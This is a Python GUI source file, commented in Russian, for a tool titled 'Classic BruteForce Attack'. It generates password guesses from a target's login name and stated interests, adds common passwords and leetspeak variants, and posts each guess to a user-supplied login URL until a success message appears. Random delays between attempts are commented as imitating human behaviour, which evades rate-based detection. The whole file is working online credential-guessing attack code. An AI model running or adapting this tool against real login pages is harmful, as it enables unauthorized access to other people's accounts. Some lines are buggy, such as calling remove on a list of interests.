import customtkinter as ctk
import threading
import os
import time
import sys
import random
import requests
import json

sys.path.append(os.path.dirname(os.path.abspath(__file__)) + "..")  # Добавляем путь к родительской директории

from virtual_keyboard import NormalKeyboard  # Импортируем виртуальную клавиатуру

def clear_frame(frame):
    """Очищает все виджеты в указанном фрейме."""
    for widget in frame.winfo_children():
        widget.destroy()

def generate_passwords(name, interests, text_box):
    passwords = []
    current_year = 2025  # Можно заменить на динамическое вычисление года

    if " " in interests:
        interests.remove(" ")
        interests.replace(" ", "_")

    # Пробуем комбинации имени с интересами
    passwords.append(name.lower())
    passwords.append(name.upper())
    passwords.append(name + "123")
    passwords.append(name + "2025")

    for interest in interests:
        passwords.append(interest.lower())
        passwords.append(interest.upper())
        passwords.append(interest + "123")
        passwords.append(interest + str(current_year))
        passwords.append(str(current_year) + interest)
        passwords.append("123" + interest)
        passwords.append(interest + "2025")
        passwords.append(interest + random.choice(["_", "-", ".", "@"]) + "1")

        # Добавляем комбинации вида "<digit><interest><digit>"
        for digit in range(1, 10):  # Для всех цифр от 1 до 9
            for i in range(1, 10):  # Для каждой цифры от 1 до 9 в конце
                password = str(digit) + interest + str(i)  # Пример: 1Gladkih1, 1Gladkih2, ..., 9Gladkih9
                passwords.append(password)
                text_box.insert("end", f"{password}\n")  # Выводим в TextBox
                text_box.yview("end")  # Прокручиваем TextBox вниз

        # Добавляем цифры от 1 до 9 к интересам
        random_digits = "".join([str(random.randint(1, 9)) for _ in range(3)])
        password1 = random_digits + interest
        password2 = interest + random_digits
        passwords.append(password1)
        passwords.append(password2)
        text_box.insert("end", f"{password1}\n")  # Выводим в TextBox
        text_box.insert("end", f"{password2}\n")  # Выводим в TextBox
        text_box.yview("end")  # Прокручиваем TextBox вниз

        # Пробуем комбинировать имя с интересами
        password1 = name + random.choice(["-", "_", ".", ""]) + interest
        password2 = interest + random.choice([name, "2025", "password"])
        passwords.append(password1)
        passwords.append(password2)
        text_box.insert("end", f"{password1}\n")  # Выводим в TextBox
        text_box.insert("end", f"{password2}\n")  # Выводим в TextBox
        text_box.yview("end")  # Прокручиваем TextBox вниз

    # Пробуем общие фразы
    common_phrases = ["password", "letmein", "welcome", "iloveyou", "qwerty", "123456", "sunshine", "qwerty123"]
    for phrase in common_phrases:
        passwords.append(phrase)
        passwords.append(phrase.capitalize())
        passwords.append(phrase + "123")
        text_box.insert("end", f"{phrase}\n")  # Выводим в TextBox
        text_box.insert("end", f"{phrase.capitalize()}\n")  # Выводим в TextBox
        text_box.insert("end", f"{phrase}123\n")  # Выводим в TextBox
        text_box.yview("end")  # Прокручиваем TextBox вниз

    def replace_with_numbers(password):
        replacements = {'a': '4', 'e': '3', 's': '5', 'i': '1', 'o': '0'}
        return ''.join([replacements.get(c, c) for c in password])

    # Преобразуем и выводим в TextBox изменённые пароли
    for p in passwords:
        replaced_password = replace_with_numbers(p)
        text_box.insert("end", f"{replaced_password}\n")  # Выводим в TextBox
        text_box.yview("end")  # Прокручиваем TextBox вниз

    return passwords

def init_classic_bruteforce_ui(parent_frame, go_back_callback=None):
    """Создает интерфейс для классического брутфорса."""
    clear_frame(parent_frame)

    # Основной контейнер (горизонтальный фрейм)
    container = ctk.CTkFrame(parent_frame)
    container.pack(fill="both", expand=True, padx=10, pady=10)

    # Верхняя часть (ввод данных)
    top_frame = ctk.CTkFrame(container)
    top_frame.pack(side="top", fill="both", expand=True, padx=10, pady=10)

    # Нижняя часть (виртуальная клавиатура)
    bottom_frame = ctk.CTkFrame(container)
    bottom_frame.pack(side="bottom", fill="x", expand=False, padx=10, pady=10)

    # Левая часть (ввод данных)
    left_frame = ctk.CTkFrame(top_frame, width=300)
    left_frame.pack(side="left", fill="y", padx=(0, 10), pady=10)

    # Правая часть (разделена на верхнюю и нижнюю)
    right_frame = ctk.CTkFrame(top_frame)
    right_frame.pack(side="left", fill="both", expand=True, pady=10)

    # Верхняя часть правой части (TextBox для результатов)
    top_right_frame = ctk.CTkFrame(right_frame)
    top_right_frame.pack(side="top", fill="both", expand=True, pady=10)

    # Нижняя часть правой части (виртуальная клавиатура)
    bottom_right_frame = ctk.CTkFrame(right_frame)
    bottom_right_frame.pack(side="bottom", fill="x", pady=10)

    # Заголовок
    label_title = ctk.CTkLabel(left_frame, text="Classic BruteForce Attack", font=("Arial", 24))
    label_title.pack(pady=10)

    # Поле ввода IP-адреса или домена
    label_target = ctk.CTkLabel(left_frame, text="Target IP / Domain:", font=("Arial", 16))
    label_target.pack(pady=5)
    entry_target = ctk.CTkEntry(left_frame, placeholder_text="Enter IP or Domain", font=("Arial", 16), width=300)
    entry_target.pack(pady=5, padx=(3, 0))

    label_interest = ctk.CTkLabel(left_frame, text="Interest:", font=("Arial", 16))
    label_interest.pack(pady=5)
    entry_interest = ctk.CTkEntry(left_frame, placeholder_text="Enter Interest", font=("Arial", 16), width=300)
    entry_interest.pack(pady=5, padx=(3, 0))

    label_login = ctk.CTkLabel(left_frame, text="Login:", font=("Arial", 16))
    label_login.pack(pady=5)
    entry_login = ctk.CTkEntry(left_frame, placeholder_text="Enter Login", font=("Arial", 16), width=300)
    entry_login.pack(pady=5, padx=(3, 0))

    text_box = ctk.CTkTextbox(top_right_frame, font=("Arial", 16))
    text_box.pack(fill="both", expand=True, padx=10, pady=10)

    combobox = ctk.CTkComboBox(left_frame, values=["password list", "Generate password"], font=("Arial", 16), fg_color="black", width=300) 
    combobox.set("Select password type")  # Устанавливаем текст по умолчанию
    combobox.pack(pady=10, padx=(3, 0))

    start_btn = ctk.CTkButton(
        left_frame,
        text="Start Attack",
        command=lambda: threading.Thread(target=run_attack, daemon=True).start(),
        font=("Arial", 16),
        fg_color="#000000",  # Чёрный фон
        text_color="#FFFFFF",
        width=40
    )
    start_btn.pack(pady=7, padx=10, side="left")  # Размещаем слева

    save_btn = ctk.CTkButton(
        left_frame,
        text="Save Results",
        command=lambda: save_results(text_box.get("1.0", "end-1c")),
        font=("Arial", 16),
        fg_color="#000000",  # Чёрный фон
        text_color="#FFFFFF",  # Белый текст
        width=40
    )
    save_btn.pack(pady=7, padx=10, side="left")  # Размещаем рядом

    back_button = ctk.CTkButton(
        left_frame,
        text="← Back",
        command=go_back_callback,
        font=("Arial", 16),
        fg_color="#000000",  # Чёрный фон
        text_color="#FFFFFF",  # Белый текст
        width=40,
    )
    back_button.pack(pady=7, padx=10, side="left")  # Размещаем рядом


    def set_target_entry(entry, name):
        keyboard.target_entry = entry  # Устанавливаем целевой элемент ввода для клавиатуры

    keyboard = NormalKeyboard(bottom_right_frame, entry_target)  # Создаем виртуальную клавиатуру

    entry_target.bind("<FocusIn>", lambda event: set_target_entry(entry_target, "target"))
    entry_interest.bind("<FocusIn>", lambda event: set_target_entry(entry_interest, "interest"))
    entry_login.bind("<FocusIn>", lambda event: set_target_entry(entry_login, "login"))

    def run_attack():
        """Запускает брутфорс-атаку с HTTP-запросами и выводит результат в TextBox."""
        target_ip = entry_target.get()  # Получаем IP или домен
        interests = entry_interest.get().split(",")  # Получаем интересы (разделенные запятыми)
        login = entry_login.get()  # Получаем логин
        password_type = combobox.get()  # Получаем тип пароля (из файла или сгенерированные)

        # Формируем URL для атаки
        url = target_ip

        # Обновляем TextBox
        text_box.insert("end", f"Starting attack on {target_ip}...\n")
        text_box.yview("end")  # Прокручиваем TextBox вниз

        if password_type == "password list":
            # Ожидаем файл с паролями
            password_file_path = "passwords.txt"  # Пример пути к файлу с паролями
            if os.path.exists(password_file_path):
                with open(password_file_path, "r") as f:
                    passwords = [line.strip() for line in f.readlines()]
            else:
                text_box.insert("end", "Password list file not found!\n")
                text_box.yview("end")
                return
        elif password_type == "Generate password":
            passwords = generate_passwords(login, interests, text_box)  # Генерируем пароли
        else:
            text_box.insert("end", "Invalid password type selected!\n")
            text_box.yview("end")
            return  # Завершаем выполнение, если тип пароля некорректен

        # Цикл по паролям
        for password in passwords:
            # Формируем данные для отправки в запросе
            payload = {
                'username': login,
                'password': password
            }

            # Отправляем POST-запрос на сервер
            try:
                response = requests.post(url, data=payload)
                print(f"Sending request to {url} with payload: {payload}")
                print(f"Response status: {response.status_code}, Response body: {response.text}")

                # Проверяем успешный ответ (например, если статус код 200)
                if response.status_code == 200 and "✅ Вход успешен!" in response.text:
                    text_box.insert("end", f"Login successful with password: {password}\n")
                    text_box.yview("end")  # Прокручиваем TextBox вниз
                    break  # Останавливаем атаку, если логин успешен
                else:
                    text_box.insert("end", f"Attempt with password: {password} failed.\n")
                    text_box.yview("end")  # Прокручиваем TextBox вниз
            
            except requests.exceptions.RequestException as e:
                text_box.insert("end", f"Error during request: {e}\n")
                text_box.yview("end")  # Прокручиваем TextBox вниз
            
            time.sleep(random.uniform(1, 3))  # Ожидание между запросами для имитации "человеческого" поведения

        text_box.insert("end", "Attack finished!\n")
        text_box.yview("end")  # Прокручиваем TextBox вниз

    def save_results(results):
        """Сохраняет результаты в файл."""
        if not os.path.exists("results"):
            os.makedirs("results")
        with open(f"results/{entry_login.get()}_results.txt", "w") as f:
            f.write(results)